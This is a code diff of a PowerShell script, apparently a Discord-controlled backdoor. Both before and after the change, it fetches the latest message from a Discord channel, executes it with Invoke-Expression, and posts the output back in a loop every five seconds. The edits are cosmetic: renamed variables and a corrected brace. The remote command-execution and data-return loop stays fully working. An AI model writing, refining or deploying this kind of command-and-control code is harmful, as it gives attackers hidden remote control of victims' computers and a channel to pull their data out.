@@ -15,25 +15,24 @@ function Send-DiscordMessage {
 }
 
 function Get-LastCommand {
-    $res = Invoke-RestMethod -Uri $BaseURL -Headers $Header -Method Get
-    return $res[0].content
+    $response = Invoke-RestMethod -Uri $BaseURL -Headers $Header -Method Get
+    return $response[0].content
 }
 
-$last = ""
+$lastCommand = ""
 
 while ($true) {
     try {
-        $cmd = Get-LastCommand
-        if ($cmd -ne $last -and $cmd -notmatch "^!") 
-        {
-            $output = Invoke-Expression $cmd | Out-String
-            Send-DiscordMessage "```\n$output`n```"
-            $last = $cmd
+        $command = Get-LastCommand
+        if ($command -ne $lastCommand -and $command -notmatch "^!") {
+            $output = Invoke-Expression $command | Out-String
+            Send-DiscordMessage -msg "```\n$output`n```"
+            $lastCommand = $command
         }
     }
-    }
     catch {
-        Send-DiscordMessage "ERROR: $($_.Exception.Message)"
+        $errMsg = "ERROR: $($_.Exception.Message)"
+        Send-DiscordMessage -msg $errMsg
     }
     Start-Sleep -Seconds 5
 }
